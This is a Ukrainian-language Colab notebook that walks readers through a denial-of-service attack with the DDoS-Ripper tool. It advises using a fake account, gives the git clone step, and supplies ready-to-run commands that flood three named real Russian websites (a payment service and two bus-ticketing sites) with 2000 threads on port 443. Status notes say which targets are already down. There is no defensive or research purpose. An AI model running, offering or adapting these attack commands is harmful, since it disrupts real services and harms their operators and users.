# %% [markdown]
# <a href="https://colab.research.google.com/github/xacer2005/Coloboration/blob/main/%D0%A1%D0%BB%D0%B0%D0%B2%D0%B0_%D0%A3%D0%BA%D1%80%D0%B0%D1%97%D0%BD%D1%96_%22%D1%82%D1%83%D1%82%D0%BE%D1%80_DRipper_%D0%B2_Colaboratory%22.ipynb" target="_parent"><img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/></a>

# %% [markdown]
# тиць сюди, якщо ти з GitHub

# %% [markdown]
# # DRipper
#
# Переконайтеся, що ви зайшли з фейкового акаунта
# <br>
# Запускаємо код що під цим повідомленням, натискаємо:
# Ctrl + Enter, або збоку коду кнопку << **запуска** >>
# Чєкаємо поки встановиться DRipper

# %%
# %cd ~
# %rm -rf DDoS-Ripper &> /dev/null
# !git clone https://github.com/palahsu/DDoS-Ripper
# %cd ~/DDoS-Ripper

# %% [markdown]
# ## Команди атак для DRipper
# Вибираємо одну і запускаємо

# %% [markdown]
# Атака на payanyway.ru (ціль лежить)

# %%
# !python3 DRipper.py -s payanyway.ru -t 2000 -p 443

# %% [markdown]
# Атака на avtovokzaly.ru (ще ворушиться)

# %%
# !python3 DRipper.py -s avtovokzaly.ru -t 2000 -p 443

# %% [markdown]
# Атака на bus.tutu.ru (ціль лежить)

# %%
# !python3 DRipper.py -s bus.tutu.ru -t 2000 -p 443

# %% [markdown]
# ## Трошки інформації
# * **<--packet sent! rippering-->**  ===  пакети успішно летять
# * **bot is rippering...** === пробуємо перепідключитися до сервера
# * **server maybe down** === сервер можливо ліг, або ip заблокували пакети вже не летять

# %% [markdown]
# Вітаю браття та сестри атака успішно запущена.
# **Все буде Україна!**
